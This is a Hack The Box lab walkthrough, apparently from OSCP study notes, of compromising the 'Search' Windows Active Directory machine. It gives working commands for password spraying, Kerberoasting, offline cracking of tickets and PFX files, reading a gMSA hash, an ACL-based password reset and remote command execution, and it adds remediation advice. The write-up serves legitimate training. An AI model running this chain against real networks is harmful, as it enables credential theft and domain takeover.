---
tags: [HTB, Search, Windows, ActiveDirectory, IIS, SMB, Kerberoasting, PasswordSpraying, PKCS12, Certificates, PowerShellWebAccess, gMSA, ACLAbuse, WMI, Hard]
platform: HackTheBox
os: Windows 10 / Server 2019 Build 17763 x64
hostname: RESEARCH
difficulty: Hard
ip: 10.129.229.57
status: Complete
domain: search.htb
---

# HTB: Search, Full Walkthrough

## The gist

Search is a hard Windows Active Directory machine. The initial foothold is a password exposed in a staff image on the IIS homepage. The recovered Hope Sharp credential gives authenticated LDAP and SMB access, but the first Kerberoasting attempt fails until the domain is mapped locally.

The SPN for web_svc yields a crackable TGS. Its recovered password is reused by Edgar Jacobs, whose access to the RedirectedFolders$ share exposes a protected XLSX file. The worksheet contains candidate user/password pairs; the final pair works for Sierra Frye.

Sierra's redirected profile contains a password-protected PKCS#12 certificate. Cracking the PFX password and using the certificate for mutual TLS exposes Windows PowerShell Web Access at /staff. The interactive PowerShell session leads to an ITSec-readable group managed service account. The gMSA NT hash authenticates as BIR-ADFS-GMSA$, which has enough directory rights to reset Tristan Davies's password. Tristan authenticates with local-admin access, allowing a WMI command to read the Administrator desktop proof.

The chain is:

~~~text
IIS staff image
  -> Hope Sharp credential
  -> LDAP/SPN enumeration
  -> web_svc Kerberoast
  -> cracked password reused by Edgar Jacobs
  -> RedirectedFolders$ exposes Phishing_Attempt.xlsx
  -> XLSX strings reveal candidate credentials
  -> Sierra Frye profile exposes staff.pfx and the CA bundle
  -> cracked PFX enables client-certificate authentication to /staff
  -> PowerShell Web Access session
  -> ITSec can read BIR-ADFS-GMSA$ managed password
  -> gMSA ACL resets Tristan Davies's password
  -> Tristan has local admin
  -> NetExec WMI reads the Administrator desktop proof
~~~

> [!warning] Evidence boundary
> The source transcript contains the complete manual run, including failed exploratory commands. This write-up labels those failures as gotchas and keeps the source transcript as the authoritative command/output record.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Difficulty | Hard |
| Operating system | Windows 10 / Server 2019 Build 17763 x64 |
| Hostname | RESEARCH |
| Target | 10.129.229.57 |
| Domain | search.htb |
| Open services | DNS, IIS HTTP/HTTPS, Kerberos, RPC, LDAP/LDAPS, SMB, Global Catalog LDAP/LDAPS, WMSvc 8172, ADWS 9389 |
| Initial access | Credential in an IIS staff image |
| User-level access | Sierra Frye through SMB and Windows PowerShell Web Access |
| Privilege path | gMSA hash plus delegated password-reset rights |
| Final proof | Tristan Davies local admin; WMI command execution as Administrator |

## Vulnerability summary

| # | Vulnerability or misconfiguration | Severity | Location |
|---|---|---|---|
| 1 | Cleartext credential exposed in a publicly reachable staff image | High | IIS homepage image |
| 2 | Domain users can request a service ticket for web_svc | High | Kerberos SPN |
| 3 | Service-account password is reused by a normal user | High | web_svc / Edgar Jacobs |
| 4 | RedirectedFolders$ exposes users' redirected profiles and sensitive files | High | SMB |
| 5 | Password-bearing XLSX data is readable after share access | High | Edgar's Desktop |
| 6 | Password-protected user certificate and CA material are stored in a redirected profile | High | Sierra's Downloads/Backups |
| 7 | Client-certificate authentication exposes Windows PowerShell Web Access | High | IIS /staff |
| 8 | ITSec can read a gMSA managed password | High | BIR-ADFS-GMSA$ |
| 9 | The gMSA can reset an administrative user's password | Critical | Tristan Davies |

## Evidence and loot

The complete manual-run workspace is:

/home/kali/Platforms/HackTheBox/Search/

The raw command/output transcript is:

/home/kali/Platforms/HackTheBox/Search/Search.log

The same transcript is copied into the vault at:

/home/kali/Documents/Obsidian/main-vault/OSCP/BOXES/BOX LOGS/Search.log

| Evidence | Source location |
|---|---|
| Command and output transcript | Search.log |
| Box variables, recovered credentials, and hashes | .env |
| Full TCP scan | nmap/allports.nmap, nmap/allports.gnmap, nmap/allports.xml |
| Focused service scan | nmap/services.nmap, nmap/services.gnmap, nmap/services.xml |
| Staff names | loot/names-raw.txt |
| Candidate usernames | loot/usernames.txt |
| Downloaded IIS images | loot/images/ |
| Kerberoast TGS | loot/kerberoast.txt |
| Cracked workbook | loot/Phishing_Attempt.xlsx |
| PFX crack material | loot/staff.pfx.hash |
| Staff certificate | loot/staff.pfx |
| Search CA bundle | loot/search-RESEARCH-CA.p12 |
| PSWA login form | loot/staff-logon.html |
| PSWA cookies | loot/cookies.txt |
| User proof | loot/user.txt |
| Flag index | loot/flags.txt |
| Screenshots | screenshots/1.nmap-allports.png through screenshots/23.flag-text.png |

> [!note] Private evidence
> Passwords, hashes, and flag values remain in the source .env, loot, and raw log. They are intentionally not duplicated in the main narrative or in a public-report section.

## Variables

Use a temporary folder for a clean reproduction and retain the source workspace only as evidence from the completed run.

~~~bash
boxset BoxName Search
boxset BoxIP 10.129.229.57
boxset Domain search.htb
boxset Username hope.sharp
boxset Port 4444
boxset TransferPort 8000
boxset WebPort 80
boxset Username2 web_svc
boxset Username3 edgar.jacobs
boxset Username4 sierra.frye
~~~

For the completed manual run, the private values used by these commands can be loaded from the source environment file:

~~~bash
source /home/kali/Platforms/HackTheBox/Search/.env
~~~

The source run also recorded the PFX password and gMSA NT hash in .env. Keep those values in private loot and pass them to tools through variables rather than writing them into shared command history.

## 1. Initialise the session and preserve evidence

The manual run used the box helper and captured the terminal session in Search.log. A clean reproduction should create the local evidence tree before scanning:

~~~bash
boxstart Search 10.129.229.57 htb
htblog
mkdir -p "$BoxDir"/{nmap,loot,notes,screenshots}
~~~

> [!tip] Evidence habit
> Save the command, its output, and the artifact produced by the command together. Keep the Nmap files, the exact scan command in Search.log, and a screenshot showing the relevant service line.

## 2. Full TCP enumeration

The first unprivileged Nmap attempt failed because the environment could not open a raw socket:

~~~bash
nmap -Pn -n -p- --min-rate 2000 -T4 \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
~~~

The error was:

~~~text
Couldn't open a raw socket. Error: Operation not permitted
~~~

Rerun with sudo:

~~~bash
sudo nmap -Pn -n -p- --min-rate 2000 -T4 \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
~~~

The scan found:

~~~text
53, 80, 88, 135, 139, 389, 443, 464, 445, 593,
636, 3268, 3269, 8172, 9389
~~~

Dynamic RPC ports were also present. This was a classic domain-controller footprint with IIS and Windows Management Service additions.

![Nmap full scan](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/1.nmap-allports.png>)

> [!warning] Nmap privilege gotcha
> If Nmap reports a raw-socket permission error, do not treat it as a closed-port result. Use the connect-scan fallback when appropriate, or rerun the intended SYN scan with sudo. Record which scan produced the authoritative port list.

## 3. Service and version enumeration

Run a focused scan:

~~~bash
sudo nmap -Pn -n -sC -sV \
  -p 53,80,88,135,139,389,443,464,445,593,636,3268,3269,8172,9389 \
  -oA "$BoxDir/nmap/services" "$BoxIP"
~~~

Relevant results:

~~~text
80/tcp    open  http       Microsoft IIS httpd 10.0
443/tcp   open  https      Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  ldap
3269/tcp  open  ldapssl
8172/tcp  open  ssl/WMSVC
9389/tcp  open  mc-nmf
Service Info: Host: RESEARCH; OS: Windows
Domain: search.htb
SMB signing enabled and required
~~~

![Nmap service scan](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/2.nmap-services.png>)

Record the domain before using Kerberos tools:

~~~bash
boxset Domain search.htb
~~~

> [!abstract] Branch decision
> TCP/88, LDAP, SMB, Global Catalog, and IIS indicate an AD-first path. WMSvc on 8172 and ADWS on 9389 are supporting clues; the exposed web content and directory services are the first branches.

## 4. Null SMB and initial web reconnaissance

Check the SMB banner and anonymous behavior:

~~~bash
netexec smb "$BoxIP"
netexec smb "$BoxIP" --shares -u '' -p ''
~~~

Null authentication negotiation worked, but anonymous share enumeration returned access denied. That is useful evidence: anonymous negotiation is enabled, but it does not provide useful share access.

![SMB null authentication](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/3.smb-null.png>)

Inspect the IIS homepage and protected paths:

~~~bash
curl -si "http://$BoxIP" | head -30
curl -si "http://$BoxIP/staff"
curl -si "http://$BoxIP/certsrv"
~~~

The homepage title was Search — Just Testing IIS. /staff returned 403 without the required client certificate. /certsrv returned 401 with Negotiate and NTLM challenges, confirming that AD CS was present.

![Team names](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/4.team-names.png>)

![AD CS authentication clue](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/5.certsrv-401.png>)

## 5. Download the homepage images and recover the first credential

Extract the staff names:

~~~bash
curl -s "http://$BoxIP" |
  grep -A5 'class="p-3"' |
  grep -oP '(?<=<h3>)[^<]+' |
  tee "$BoxDir/loot/names-raw.txt"
~~~

The first image-download attempt failed because the destination directory did not exist. Create it, extract every referenced image, and download them:

~~~bash
mkdir -p "$BoxDir/loot/images"
curl -s "http://$BoxIP" |
  grep -oP 'images/[^"]+\.(jpg|png|gif)' |
  sort -u |
  while read img; do
    curl -s "http://$BoxIP/$img" \
      -o "$BoxDir/loot/images/$(basename "$img")"
  done
ls -l "$BoxDir/loot/images"
~~~

The useful image was slide_2.jpg. It is a diary/planner image with a handwritten instruction to send a password to Hope Sharp and the password itself. This provided:

~~~text
hope.sharp : [private password in .env]
~~~

![Initial image credential](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/6.OSINT-foothold.png>)

> [!warning] Image-review gotcha
> Do not stop after extracting visible names from a homepage. Download every referenced image and inspect it at readable resolution. The password was not in the HTML or page text; it was handwritten inside a staff photo.

## 6. Validate Hope Sharp and enumerate authenticated SMB

Validate the recovered credential once:

~~~bash
netexec ldap "$BoxIP" -u hope.sharp -p "$Password"
netexec smb "$BoxIP" -u hope.sharp -p "$Password"
netexec smb "$BoxIP" -u hope.sharp -p "$Password" --shares
~~~

Hope could read CertEnroll, IPC$, NETLOGON, RedirectedFolders$, and SYSVOL. RedirectedFolders$ also permitted writing, making user profiles the next source of names and files.

![Hope credential validation](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/7.hope-sharp-valid.png>)

![Hope share access](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/8.hope-shares.png>)

## 7. Build the username list and fix Kerberos name resolution

Enumerate the redirected profile root:

~~~bash
smbclient "//$BoxIP/RedirectedFolders$" \
  -U "search.htb/hope.sharp%$Password" -c "ls"

smbclient "//$BoxIP/RedirectedFolders$" \
  -U "search.htb/hope.sharp%$Password" -c "ls" |
  awk 'NR>2 && $1 !~ /^\.$|^\.\.$|blocks/ {print $1}' |
  tee "$BoxDir/loot/usernames.txt"
~~~

The list included real profile names plus one accidental numeric filesystem-listing line. Keep the raw list as evidence and remove non-user artifacts before spraying.

Try Kerberoasting:

~~~bash
netexec ldap "$BoxIP" -u hope.sharp -p "$Password" \
  --kerberoasting "$BoxDir/loot/kerberoast.txt"
~~~

The first attempt failed because the tool tried to resolve SEARCH.HTB:

~~~text
Name or service not known
~~~

Add the domain mapping and retry:

~~~bash
echo "$BoxIP search.htb" | sudo tee -a /etc/hosts
netexec ldap "$BoxIP" -u hope.sharp -p "$Password" \
  --kerberoasting "$BoxDir/loot/kerberoast.txt"
~~~

The retry returned a service principal for web_svc and wrote a $krb5tgs$23$ ticket to loot.

![Redirected profile names](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/9.redirected-floders.png>)

![Kerberoasting result](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/10.kerboroast-hit.png>)

> [!warning] Kerberos DNS gotcha
> Kerberos is name-sensitive. A valid IP connection can still fail if the realm/domain and DC names do not resolve. Save the original /etc/hosts, add only the required mapping, and use the FQDN consistently in later certificate and PSWA steps.

## 8. Crack web_svc and spray the recovered password

Crack the captured TGS offline:

~~~bash
john "$BoxDir/loot/kerberoast.txt" \
  --wordlist=/usr/share/wordlists/rockyou.txt
boxset Username2 web_svc
netexec smb "$BoxIP" -u "$Username2" -p "$Password2"
~~~

The recovered web_svc password was valid. Spray that one password across the cleaned candidate usernames:

~~~bash
netexec smb "$BoxIP" \
  -u "$BoxDir/loot/usernames.txt" \
  -p "$Password2" \
  --continue-on-success
~~~

The successful results were web_svc and edgar.jacobs. The important finding was password reuse: a service-account password also authenticated as Edgar.

![Cracked web service account](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/11.websrvc-cracked.png>)

![Edgar password-reuse hit](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/12.edgar-spray-hit-pwd-reuse.png>)

> [!warning] Spray discipline
> One password across many known usernames is a controlled spray. Do not turn this into a password dictionary per user. Preserve the list, exact password source, service tested, and successful accounts.

## 9. Use Edgar's SMB access to find the protected XLSX

Enumerate Edgar's shares:

~~~bash
boxset Username3 edgar.jacobs
netexec smb "$BoxIP" -u "$Username3" -p "$Password2" --shares
~~~

Edgar could read Helpdesk and RedirectedFolders$. Helpdesk was empty. The redirected profile exposed the normal user folders:

~~~bash
smbclient "//$BoxIP/RedirectedFolders$" \
  -U "search.htb/edgar.jacobs%$Password2" \
  -c "ls edgar.jacobs/Desktop/"

smbclient "//$BoxIP/RedirectedFolders$" \
  -U "search.htb/edgar.jacobs%$Password2" \
  -c "recurse ON; ls" 2>/dev/null | grep -i xlsx
~~~

The Desktop contained Phishing_Attempt.xlsx. The first wildcard mget failed with NT_STATUS_NO_SUCH_FILE because the wildcard did not match the server-side path. Use the exact path:

~~~bash
smbclient "//$BoxIP/RedirectedFolders$" \
  -U "search.htb/edgar.jacobs%$Password2" \
  -c 'get "edgar.jacobs/Desktop/Phishing_Attempt.xlsx" '"$BoxDir"'/loot/Phishing_Attempt.xlsx'
~~~

![Edgar share access](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/13.edgar-shares.png>)

> [!warning] SMB path gotcha
> A successful share connection does not mean a shell wildcard resolves the same way as a server-side SMB path. When mget fails, list the directory and issue a quoted get for the exact relative path.

## 10. Treat the XLSX as a ZIP/XML evidence source

List the Office archive and inspect the shared strings:

~~~bash
unzip -l "$BoxDir/loot/Phishing_Attempt.xlsx"
unzip -p "$BoxDir/loot/Phishing_Attempt.xlsx" \
  xl/sharedStrings.xml | xmllint --format -
~~~

The workbook headers included firstname, lastname, and password. The strings contained multiple candidate passwords associated with staff names. The successful row was the Sierra Frye entry, recorded privately as Username4 and Password4.

![XLSX extracted strings](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/14.xlsx-strings.png>)

> [!abstract] XLSX triage pattern
> An Office document is a ZIP archive. Start with unzip -l, then inspect sharedStrings.xml and worksheet XML. Workbook or worksheet protection does not necessarily protect the underlying XML from offline review.

## 11. Validate Sierra and collect the user proof

Validate Sierra and retrieve user.txt from the exact Desktop path:

~~~bash
boxset Username4 sierra.frye
netexec smb "$BoxIP" -u "$Username4" -p "$Password4"

smbclient "//$BoxIP/RedirectedFolders$" \
  -U "search.htb/sierra.frye%$Password4" \
  -c 'get "sierra.frye/Desktop/user.txt" '"$BoxDir"'/loot/user.txt' &&
  cat "$BoxDir/loot/user.txt"
~~~

The user proof was saved to loot/user.txt and indexed in loot/flags.txt.

![User proof](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/15.user-flag.png>)

Sierra's Downloads/Backups directory contained:

~~~bash
smbclient "//$BoxIP/RedirectedFolders$" \
  -U "search.htb/sierra.frye%$Password4" \
  -c "ls sierra.frye/Downloads/Backups/"
~~~

~~~text
search-RESEARCH-CA.p12
staff.pfx
~~~

Download both:

~~~bash
smbclient "//$BoxIP/RedirectedFolders$" \
  -U "search.htb/sierra.frye%$Password4" \
  -c 'get "sierra.frye/Downloads/Backups/staff.pfx" '"$BoxDir"'/loot/staff.pfx; get "sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12" '"$BoxDir"'/loot/search-RESEARCH-CA.p12'
~~~

![Certificate backups](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/16.backups-certs.png>)

## 12. Crack and inspect the staff PKCS#12 certificate

An empty-password OpenSSL attempt failed. Extract a John-compatible hash and crack the PFX offline:

~~~bash
openssl pkcs12 -in "$BoxDir/loot/staff.pfx" -nokeys -clcerts \
  -passin pass: 2>/dev/null | openssl x509 -noout -subject -issuer

pfx2john "$BoxDir/loot/staff.pfx" > "$BoxDir/loot/staff.pfx.hash"
john "$BoxDir/loot/staff.pfx.hash" \
  --wordlist=/usr/share/wordlists/rockyou.txt
john "$BoxDir/loot/staff.pfx.hash" --show
# PfxPass is loaded from the private .env after john --show.
~~~

Inspect the certificate:

~~~bash
openssl pkcs12 -in "$BoxDir/loot/staff.pfx" \
  -nokeys -clcerts -passin pass:"$PfxPass" 2>/dev/null |
  openssl x509 -noout -subject -issuer
~~~

The subject identified Sierra Frye and the issuer was search-RESEARCH-CA. This ties the certificate to the AD CS infrastructure hinted at by /certsrv.

![PFX cracked](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/17.pfx-cracked.png>)

![PFX subject and issuer](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/18.pfx-subject.png>)

> [!warning] PKCS#12 gotcha
> A PFX/P12 file is not a PEM certificate. OpenSSL can inspect it, but curl must be told --cert-type P12; otherwise it attempts PEM parsing and reports that it cannot load the PEM client certificate.

## 13. Use the certificate to reach Windows PowerShell Web Access

Use the domain/FQDN and specify the P12 type:

~~~bash
curl -sk "https://$Domain/staff" \
  --cert-type P12 \
  --cert "$BoxDir/loot/staff.pfx:$PfxPass" \
  -o /dev/null -w "%{http_code}\n"

curl -skL "https://$Domain/staff" \
  --cert-type P12 \
  --cert "$BoxDir/loot/staff.pfx:$PfxPass" \
  -D - 2>/dev/null | grep -E '^Location:|<title>'
~~~

The route was /staff/, then /staff/en-US/logon.aspx. Save the form and cookies:

~~~bash
curl -skL "https://$Domain/staff" \
  --cert-type P12 \
  --cert "$BoxDir/loot/staff.pfx:$PfxPass" \
  -c "$BoxDir/loot/cookies.txt" \
  -b "$BoxDir/loot/cookies.txt" \
  -o "$BoxDir/loot/staff-logon.html" \
  -w "%{http_code}\n"
grep -i 'title\|form\|input\|action' \
  "$BoxDir/loot/staff-logon.html" | head -20
~~~

The ASP.NET form contained hidden ViewState and EventValidation fields plus username, password, target node, connection type, port, application, and configuration fields. The manual run used Firefox:

~~~bash
firefox "https://$Domain/staff" &
~~~

In the PSWA form:

1. Set the username to Sierra Frye.
2. Enter Sierra's recovered password.
3. Select computer-name as the connection type.
4. Set the target node to research.
5. Leave the normal WSMAN port and Microsoft.PowerShell configuration.
6. Submit and confirm an interactive PowerShell console.

![PowerShell Web Access login](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/19.pwr-login.png>)

> [!warning] PSWA gotcha
> PSWA is a stateful ASP.NET application. Replaying only the visible fields is not enough; hidden ViewState/EventValidation values and cookies are part of the login flow. The browser was the reliable manual client.

## 14. Enumerate groups and retrieve the gMSA hash

The manual PowerShell session was used to inspect identity and groups:

~~~powershell
whoami
hostname
whoami /groups
~~~

From Kali, use authenticated LDAP to ask NetExec for readable gMSA passwords:

~~~bash
netexec ldap "$BoxIP" \
  -u "$Username4" -p "$Password4" --gmsa
~~~

The result identified BIR-ADFS-GMSA$ and PrincipalsAllowedToReadPassword: ITSec. The command also returned the gMSA NT hash; save it privately and keep the trailing dollar sign in the account name.

![PowerShell groups](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/20.groups.png>)

![gMSA hash retrieval](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/21.gmsa-hash.png>)

> [!warning] gMSA syntax gotcha
> Service and machine accounts end in $. Quote BIR-ADFS-GMSA$ in shell commands so the shell does not interpret the dollar sign. A gMSA read is also an authorization finding: record both the readable account and the group listed under PrincipalsAllowedToReadPassword.

## 15. Authenticate as the gMSA and reset Tristan's password

Validate the gMSA NT hash over SMB and use BloodyAD to change Tristan's password:

~~~bash
# GmsaHash is loaded from the private .env after the --gmsa result.
netexec smb "$BoxIP" \
  -u 'BIR-ADFS-GMSA$' -H "$GmsaHash"

bloodyAD -d "$Domain" \
  -u 'BIR-ADFS-GMSA$' -p :"$GmsaHash" \
  --host "$BoxIP" \
  set password Tristan.Davies 'Passw0rd123!'

netexec smb "$BoxIP" \
  -u Tristan.Davies -p 'Passw0rd123!'
~~~

The gMSA authenticated successfully, BloodyAD reported Password changed successfully, and NetExec returned Pwn3d!, proving local administrator access.

![Tristan local administrator validation](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/22.tristan-pwn3d.png>)

> [!warning] ACL-abuse gotcha
> The gMSA hash is not automatically Domain Admin. Its value is the authenticated identity that has a delegated directory right. Verify the exact target object and right, make one controlled password change, validate it, and record the state that must be restored.

## 16. Read the Administrator desktop proof through WMI

The first NetExec command was malformed by an unmatched quote and left the shell at a quote continuation prompt:

~~~text
quote>
~~~

Retry with the complete command and a correctly quoted Windows path:

~~~bash
netexec smb "$BoxIP" \
  -u Tristan.Davies -p 'Passw0rd123!' \
  -x 'type C:\Users\Administrator\Desktop\root.txt'
~~~

The output was saved as the root proof in loot/flags.txt. The completed run then recorded:

~~~bash
boxdone
~~~

![Final flag text](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/23.flag-text.png>)

> [!tip] Final-proof habit
> When NetExec reports Pwn3d!, use a single harmless read command to prove the requested file or identity. Keep the command short, quote the Windows path once, and save the raw output before marking the box complete.

## RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/AD - Service Scan|AD - Service Scan]] — full TCP and focused service enumeration
- [[OSCP/RUNBOOK V2/AD - Web Enum|AD - Web Enum]] — IIS content, staff names, image download, and /certsrv clue
- [[OSCP/RUNBOOK V2/AD - Credential Validation|AD - Credential Validation]] — Hope, web_svc, Edgar, and Sierra validation
- [[OSCP/RUNBOOK V2/AD - Kerberoasting|AD - Kerberoasting]] — SPN discovery, TGS capture, and offline cracking
- [[OSCP/RUNBOOK V2/AD - Group Triage|AD - Group Triage]] — Sierra's group context and ITSec route
- [[OSCP/RUNBOOK V2/AD - BloodHound|AD - BloodHound]] — directory-rights reasoning and gMSA/ACL triage
- [[OSCP/RUNBOOK V2/AD - ForceChangePassword|AD - ForceChangePassword]] — gMSA-to-Tristan password reset
- [[OSCP/RUNBOOK V2/AD - WinRM Foothold|AD - WinRM Foothold]] — Windows PowerShell Web Access shell identity and triage
- [[OSCP/RUNBOOK V2/AD - Clean Down|AD - Clean Down]] — evidence retention, host-file cleanup, and target-state warning

## Collect the flags

The manual run saved both proofs under:

~~~text
/home/kali/Platforms/HackTheBox/Search/loot/user.txt
/home/kali/Platforms/HackTheBox/Search/loot/flags.txt
~~~

The raw flag values are intentionally not repeated in this write-up. Use loot/flags.txt for the private completed-run record.

## Clean down

The manual run executed boxdone and did not upload a persistent payload. Local evidence should be retained, but these state changes need attention:

- search.htb was appended to /etc/hosts.
- research.search.htb was appended to /etc/hosts.
- Tristan Davies's password was changed to the temporary lab value.
- The temporary password was not restored in the recorded transcript.
- PFX, CA, cookies, hashes, workbook, screenshots, and flags remain in the local case folder.

For a fresh run, back up and restore the hosts file:

~~~bash
sudo cp -a /etc/hosts "$BoxDir/notes/hosts.before"
sudo cp -a "$BoxDir/notes/hosts.before" /etc/hosts
~~~

Because the password change was performed against the target, the safest target-side cleanup is to reset or revert the lab machine rather than claim that the original Tristan password was restored. Do not delete local source evidence merely to make the working directory look clean.

## Attack narrative in one page

1. Nmap required sudo for the raw-socket scan; the service scan identified IIS plus a full AD/DC footprint.
2. Anonymous SMB negotiation worked but did not disclose useful shares.
3. The IIS homepage exposed staff names and images; slide_2.jpg contained Hope Sharp's password.
4. Hope authenticated to LDAP and SMB and could access RedirectedFolders$.
5. Kerberoasting initially failed on name resolution; after mapping search.htb locally, the web_svc TGS was captured and cracked.
6. The cracked service password was reused by Edgar Jacobs.
7. Edgar's redirected profile exposed Phishing_Attempt.xlsx. Offline Office XML inspection revealed candidate credentials.
8. Sierra Frye's credential exposed a backup folder containing staff.pfx and search-RESEARCH-CA.p12.
9. pfx2john and John recovered the PFX password. curl required --cert-type P12 and the correct hostname.
10. The Sierra certificate reached PSWA, where the browser opened an interactive PowerShell session.
11. Authenticated LDAP gMSA enumeration returned BIR-ADFS-GMSA$ and its NT hash, readable through ITSec.
12. The gMSA changed Tristan Davies's password. NetExec confirmed local admin with Pwn3d!.
13. A correctly quoted NetExec WMI command read the Administrator desktop proof.

## Tools used

- Nmap — full TCP and service/version scanning
- curl — HTTP headers, content, image extraction, redirects, and certificate testing
- Firefox — manual Windows PowerShell Web Access login
- NetExec — SMB/LDAP validation, share enumeration, controlled password spray, gMSA enumeration, and WMI command execution
- smbclient — authenticated share traversal and exact-path file retrieval
- John the Ripper — Kerberos TGS and PKCS#12 password cracking
- pfx2john — PKCS#12-to-John hash extraction
- OpenSSL — certificate subject/issuer inspection
- unzip and xmllint — Office archive and XML inspection
- BloodyAD — delegated AD password reset

## Credentials and secrets

Private values are preserved in /home/kali/Platforms/HackTheBox/Search/.env, loot/kerberoast.txt, loot/staff.pfx.hash, loot/flags.txt, and the raw transcript.

| Identity | Source | Use |
|---|---|---|
| hope.sharp | IIS image; .env | Initial LDAP/SMB access |
| web_svc | Kerberoast ticket; .env | Password-reuse discovery |
| edgar.jacobs | Password spray; .env | XLSX retrieval |
| sierra.frye | XLSX; .env | User proof, certificate backup, PSWA |
| BIR-ADFS-GMSA$ | gMSA LDAP read; .env | Delegated AD password reset |
| Tristan.Davies | Temporary password set by BloodyAD | Local administrator validation and final proof |

> [!warning] Handling
> Do not paste the private values into a public report. Rotate or revert target-side credentials before reusing the lab instance.

## Sensitive transcript evidence

The transcript proves:

- Nmap raw-socket failure followed by the successful sudo scan.
- Null SMB negotiation with access-denied share enumeration.
- /certsrv returning a Windows authentication challenge.
- Homepage images being downloaded and slide_2.jpg yielding the Hope credential.
- Hope's authenticated shares and the first Kerberos name-resolution failure.
- Successful web_svc TGS capture and John crack.
- Password spray success for web_svc and Edgar.
- Edgar's share enumeration, failed wildcard mget, and exact XLSX download.
- XLSX XML extraction and the Sierra candidate.
- Sierra user proof retrieval and the two certificate backups.
- PFX cracking, certificate subject/issuer inspection, and the --cert-type P12 correction.
- PSWA redirect/form collection and browser login.
- gMSA read authorization through ITSec.
- gMSA SMB validation, BloodyAD password reset, Tristan Pwn3d!, malformed WMI command, and corrected final read.

## Remediation

1. Remove credentials from public images and review media files for unintended disclosures.
2. Use unique, long service-account passwords and prevent service-account password reuse by human users.
3. Restrict RedirectedFolders$ with least privilege; do not expose other users' Desktop, Downloads, or backup directories.
4. Remove password-bearing spreadsheets from user profiles and protect sensitive workbook data with appropriate access controls and encryption.
5. Protect PFX/PKCS#12 private keys, use strong passphrases, and prevent certificate backups from being stored in redirected user folders.
6. Review AD CS enrollment, certificate template permissions, and IIS client-certificate mappings.
7. Restrict Windows PowerShell Web Access to approved administrators, hosts, and authentication paths.
8. Limit PrincipalsAllowedToReadPassword on gMSAs to the exact services that require it.
9. Review gMSA ACLs and remove password-reset rights over administrative accounts.
10. Monitor password resets, service-ticket requests, gMSA password reads, and unusual SMB profile traversal.

## Lessons learned

- A public image is part of the attack surface; visually inspect downloaded media.
- Kerberos failures often mean naming or realm configuration, not invalid credentials.
- A successful authenticated share can still hide useful files behind exact relative paths.
- Office files deserve archive/XML triage before GUI interaction.
- PFX handling is format-sensitive: crack it offline, inspect it with OpenSSL, and tell curl that it is PKCS#12.
- A 401 on /certsrv can be an important AD CS clue even when the route is not the immediate foothold.
- PSWA is a browser-oriented, stateful management application; preserve cookies and hidden fields.
- gMSA enumeration is an authorization check, not merely a hash dump. Record who may read the managed password.
- A WMI command can fail because of shell quoting; save the malformed attempt and retry with a minimal, correctly quoted command.
- Cleanup must distinguish local evidence retention from target-side state restoration.

## Related boxes

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] — AD enumeration and Kerberos fundamentals
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] — web-derived usernames and credential validation
- [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] — AS-REP/Kerberos credential attack chain
- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] — gMSA, ACL abuse, Kerberos, and delegated access
- [[OSCP/BOXES/WRITE UPS/AD/Active|Active]] — SMB, AD enumeration, and service-account credential recovery

## External resources

- [HackTricks, Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [Microsoft, PowerShell remoting troubleshooting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/remote-troubleshooting)
- [Impacket](https://github.com/fortra/impacket)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/AD - Web Enum|AD - Web Enum]]
- [[OSCP/RUNBOOK V2/AD - Kerberoasting|AD - Kerberoasting]]
- [[OSCP/RUNBOOK V2/AD - Credential Validation|AD - Credential Validation]]
- [[OSCP/RUNBOOK V2/AD - Group Triage|AD - Group Triage]]
- [[OSCP/RUNBOOK V2/AD - ForceChangePassword|AD - ForceChangePassword]]
- [[OSCP/RUNBOOK V2/AD - Clean Down|AD - Clean Down]]

## Why this matters for OSCP

Search is a strong AD practice box because no single tool completes the route. The useful habits are evidence-driven transitions: inspect web media, validate credentials once, repair Kerberos naming, crack offline artifacts, enumerate delegated rights, and prove each new authorization before moving to the next identity.
